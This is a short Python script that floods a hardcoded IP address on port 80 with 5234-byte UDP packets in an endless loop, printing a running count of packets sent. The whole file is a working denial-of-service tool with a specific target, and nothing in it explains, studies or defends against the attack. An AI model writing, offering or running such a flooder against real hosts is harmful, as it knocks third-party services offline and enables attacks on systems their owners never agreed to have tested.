import sys
import os
import socket
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = bytes(5234)
ip = "185.65.67.200"
port = 80
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print( "Sent % s packet to % s throught port:% s" %(sent,ip,port))

